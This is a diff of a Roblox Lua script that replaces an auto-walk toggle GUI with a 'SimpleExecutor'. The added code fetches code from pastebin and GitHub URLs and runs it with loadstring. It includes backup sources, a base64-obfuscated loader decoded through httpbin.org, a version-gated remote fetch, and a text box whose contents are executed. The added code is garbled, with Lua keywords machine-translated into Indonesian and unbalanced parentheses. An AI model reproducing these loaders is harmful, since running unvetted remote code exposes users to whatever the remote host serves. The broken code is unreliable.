@@ -1,72 +1,73 @@
---// Auto Walk Script with Sleek Toggle GUI //--
+loadstring(game:HttpGet("https://pastebin.com/raw/m8kR4d2N")))()
 
--- Instances
+keberhasilan lokal, err = pcall(fungsi())
+    loadstring(game:HttpGet("https://pastebin.com/raw/YourCodeHere", true))()
+akhir)
+jika tidak berhasil maka
+    peringatkan("Pemuat gagal:", err)
+akhir
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/user/repo/main/script.lua")))()
+
+sumber lokal = {
+    "https://pastebin.com/raw/BackupCode1",
+    "https://raw.githubusercontent.com/backup/repo/main/script.lua"
+}
+
+untuk _, url dalam ipairs(sumber) lakukan
+    keberhasilan lokal, hasil = pcall(fungsi())
+        kembalikan game:HttpGet(url, true)
+    akhir)
+    jika berhasil maka
+        loadstring(result)()
+        merusak
+    akhir
+akhir
+
 local ScreenGui = Instance.new("ScreenGui")
-local Frame = Instance.new("Frame")
-local UICorner = Instance.new("UICorner")
-local Title = Instance.new("TextLabel")
-local Toggle = Instance.new("TextButton")
+Frame lokal = Instance.new("Frame")
+Kotak Teks lokal = Instance.new("Kotak Teks")
+local ExecuteButton = Instance.new("TextButton")
 
--- Properties
-ScreenGui.Parent = game:GetService("CoreGui")
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.Name = "SimpleExecutor"
 
+Ukuran Bingkai = UDim2.baru(0, 300, 0, 200)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+Bingkai.WarnaLatarBelakang3 = Warna3.dariRGB(30, 30, 30)
 Frame.Parent = ScreenGui
-Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-Frame.Size = UDim2.new(0, 150, 0, 80)
-Frame.Position = UDim2.new(0.05, 0, 0.2, 0)
-Frame.Active = true
-Frame.Draggable = true
 
-UICorner.CornerRadius = UDim.new(0, 12)
-UICorner.Parent = Frame
+Ukuran Kotak Teks = UDim2.baru(1, -20, 0.7, -10)
+TextBox.Position = UDim2.new(0, 10, 0, 10)
+TextBox.Text = "loadstring(game:HttpGet('https://pastebin.com/raw/m8kR4d2N'))()"
+TextBox.TextWrapped = true
+TextBox.ClearTextOnFocus = false
+Kotak Teks.Induk = Bingkai
 
-Title.Parent = Frame
-Title.Text = "Auto Walk"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.TextScaled = true
-Title.Size = UDim2.new(1, 0, 0.4, 0)
-Title.BackgroundTransparency = 1
+ExecuteButton.Size = UDim2.new(1, -20, 0.2, 0)
+ExecuteButton.Position = UDim2.new(0, 10, 0.8, 0)
+ExecuteButton.Text = "Jalankan Skrip"
+ExecuteButton.Parent = Frame
 
-Toggle.Parent = Frame
-Toggle.Text = "OFF"
-Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
-Toggle.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
-Toggle.Size = UDim2.new(0.7, 0, 0.35, 0)
-Toggle.Position = UDim2.new(0.15, 0, 0.55, 0)
-Toggle.Font = Enum.Font.SourceSansBold
-Toggle.TextScaled = true
+ExecuteButton.MouseButton1Click:Connect(function()
+    Teks skrip lokal = Kotak Teks.Teks
+    keberhasilan lokal, err = pcall(fungsi())
+        loadstring(scriptText)()
+    akhir)
+    jika tidak berhasil maka
+        peringatkan("Kesalahan eksekusi:", err)
+    akhir
+akhir)
 
--- Services
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local player = Players.LocalPlayer
+local encoded = "bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9tOGtSNGQyTiIpKSgp"
+lokal yang didekodekan = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://httpbin.org/base64/" .. yang dikodekan))
+loadstring(decoded.data)()
 
--- Toggle state
-local walkEnabled = false
+versi lokal = "1.0"
+local versionCheck = game:HttpGet("https://pastebin.com/raw/VersionFile")
+jika versionCheck:temukan (versi) maka
+    loadstring(game:HttpGet("https://pastebin.com/raw/MainScript")))()
+kalau tidak
+    peringatkan("Versi skrip sudah usang!")
+akhir
 
--- Toggle function
-local function toggleWalk()
-    walkEnabled = not walkEnabled
-    if walkEnabled then
-        Toggle.Text = "ON"
-        Toggle.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-    else
-        Toggle.Text = "OFF"
-        Toggle.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
-    end
-end
-
--- Connect Button
-Toggle.MouseButton1Click:Connect(toggleWalk)
-
--- Auto Walk Loop (runs every frame)
-RunService.RenderStepped:Connect(function()
-    if walkEnabled and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChild("Humanoid") then
-        local hrp = player.Character.HumanoidRootPart
-        local hum = player.Character.Humanoid
-
-        -- Move forward relative to where the character is facing
-        local forwardVector = hrp.CFrame.LookVector
-        hum:Move(Vector3.new(forwardVector.X, 0, forwardVector.Z), false)
-    end
-end)
